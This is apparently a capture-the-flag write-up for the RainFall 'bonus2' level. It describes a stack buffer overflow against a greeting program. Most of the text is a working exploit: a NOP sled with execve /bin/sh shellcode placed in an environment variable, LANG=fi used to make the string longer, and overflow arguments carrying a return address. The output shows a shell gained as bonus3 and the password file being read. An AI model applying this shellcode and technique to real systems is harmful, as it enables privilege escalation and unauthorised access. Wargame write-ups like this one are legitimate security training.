# Bonus 2

We're again using this [shellcode](https://shell-storm.org/shellcode/files/shellcode-811.html) that we insert in the env after a nope slide, we'll increment the pointer to it a bit to make our exploit more resilient, refer to `bonus0` for more.

```shell
export PWN=$(python -c 'print "\x90"*500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

```shell
$ ./a.out
sizeof("Hyvää päivää ") = 19
sizeof("Goedemiddag! ") = 14
```

LANG=fi for bigger string | "a" 40 times to bypass '\0' | "b" 18 times to overflow + address of shellcode in env

```shell
bonus2@RainFall:~$ LANG=fi ./bonus2 $(python -c 'print "a"*40') $(python -c 'print "b"*18 + "\x6c\xfd\xff\xbfa"')
Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbla
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
```

You can do it too with LANG=nl, but you need 5 extra bytes of padding.
You can't do it with LANG=en